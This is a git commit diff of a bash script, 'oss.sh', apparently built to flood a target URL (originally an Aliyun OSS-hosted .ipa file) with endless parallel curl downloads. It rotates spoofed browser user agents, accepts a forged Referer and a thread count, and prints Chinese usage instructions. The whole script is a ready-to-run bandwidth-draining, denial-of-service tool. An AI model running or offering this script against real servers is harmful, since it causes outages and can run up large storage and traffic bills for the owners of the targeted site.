4c395388f82a85443ba4e5b446e5fce8f694444a
usernamenotfount <64203675+usernamenotfount@users.noreply.github.com>
2020-05-23 20:45:25 +0800

    Update oss.sh

--- oss.sh
+++ oss.sh
@@ -1,33 +1,71 @@
-UAs[0]="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTMLUAs[0] like Gecko) Chrome/80.0.3987.163 Safari/537.36"
-UAs[1]"Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)"
-UAs[2]"Mozilla/5.0 (MSIE 9.0; Windows NT 6.1; Trident/5.0)"
-UAs[3]"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTMLUAs[0] like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25"
-UAs[4]"Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTMLUAs[0] like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25"
-UAs[5]"Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTMLUAs[0] like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25"
-UAs[6]"Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920)"
-UAs[7]"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20120101 Firefox/33.0"
-UAs[8]"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0"
-UAs[9]"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14"
-UAs[10]"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTMLUAs[0] like Gecko) Version/7.0.3 Safari/7046A194A"
+#!/bin/bash
 
-if [ ! -n "$1" ] ;then
-uuurl="https://zbios2.oss-cn-hongkong.aliyuncs.com/ios2.ipa"
-else
-uuurl=$1
+while getopts ":l:t:r:s" opt
+do
+    case $opt in
+        l)
+        l=$OPTARG
+        ;;
+        t)
+        t=$OPTARG
+        ;;
+        r)
+        r=$OPTARG
+        ;;
+        s)
+        pkill bash && pkill curl
+        exit 1
+        ;;
+        ?)
+        echo -e "\e[93m[用法]\n\e[93m[下载] \e[92mwget \e[91m-O \e[96moss.sh \e[96mgit.io/jhoss\e[0m"
+        echo -e "\e[93m[用法] \e[91m-l \e[96m<链接(必须)> \e[91m-t \e[96m<线程数> \e[91m-r \e[96m<Referer> \e[91m-s \e[96m<终止>\n\e[0m"
+        echo -e '\e[93m[示例1] \e[92mbash oss.sh \e[91m-l \e[96m"https://www.baidu.com" \e[0m'
+        echo -e '\e[93m[示例2] \e[92mbash oss.sh \e[91m-l \e[96m"https://www.baidu.com" \e[91m-t \e[96m8 \e[0m'
+        echo -e '\e[93m[示例3] \e[92mbash oss.sh \e[91m-l \e[96m"https://www.baidu.com" \e[91m-t \e[96m8 \e[91m-r \e[96m"https://www.baidu.com"\e[0m'
+		echo -e '\e[93m[示例4] \e[92mbash oss.sh \e[91m-s \n\e[0m'
+        exit 1
+        ;;
+    esac
+done
+
+if [ ! -n "$l" ] ;then
+	echo -e "\e[93m[用法]\n\e[93m[下载] \e[92mwget \e[91m-O \e[96moss.sh \e[96mgit.io/jhoss\e[0m"
+	echo -e "\e[93m[用法] \e[91m-l \e[96m<链接(必须)> \e[91m-t \e[96m<线程数> \e[91m-r \e[96m<Referer> \e[91m-s \e[96m<终止>\n\e[0m"
+	echo -e '\e[93m[示例1] \e[92mbash oss.sh \e[91m-l \e[96m"https://www.baidu.com" \e[0m'
+	echo -e '\e[93m[示例2] \e[92mbash oss.sh \e[91m-l \e[96m"https://www.baidu.com" \e[91m-t \e[96m8 \e[0m'
+	echo -e '\e[93m[示例3] \e[92mbash oss.sh \e[91m-l \e[96m"https://www.baidu.com" \e[91m-t \e[96m8 \e[91m-r \e[96m"https://www.baidu.com"\e[0m'
+	echo -e '\e[93m[示例4] \e[92mbash oss.sh \e[91m-s \n\e[0m'
+	exit 1
 fi
-if [ ! -n "$2" ] ;then
-t=16
-else
-t=$2
+
+if [ ! -n "$t" ] ;then
+	t=16
 fi
-for i in `seq 1 $t`
+
+if [ ! -n "$r" ] ;then
+	r=$l
+fi
+
+UAs[0]="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTMLUAs[0] like Gecko) Chrome/80.0.3987.163 Safari/537.36"
+UAs[1]="Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)"
+UAs[2]="Mozilla/5.0 (MSIE 9.0; Windows NT 6.1; Trident/5.0)"
+UAs[3]="Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTMLUAs[0] like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25"
+UAs[4]="Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTMLUAs[0] like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25"
+UAs[5]="Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTMLUAs[0] like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25"
+UAs[6]="Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920)"
+UAs[7]="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20120101 Firefox/33.0"
+UAs[8]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0"
+UAs[9]="Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14"
+UAs[10]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTMLUAs[0] like Gecko) Version/7.0.3 Safari/7046A194A"
+
+for i in $(seq 1 $t)
 do
 {
 while true
 do
 z=$[$RANDOM%11]
-#wget -O /dev/null -o /dev/null -UA=${UAs[$z]} $uuurl &
-curl -o /dev/null -A ${UAs[$z]} $uuurl 1> /dev/null 2>&1
+#wget -O /dev/null -o /dev/null -UA=${UAs[$z]} $l 1> /dev/null 2>&1
+curl -o /dev/null -A ${UAs[$z]} $l 1> /dev/null 2>&1
 done
 }&
 echo "thread $i start!"
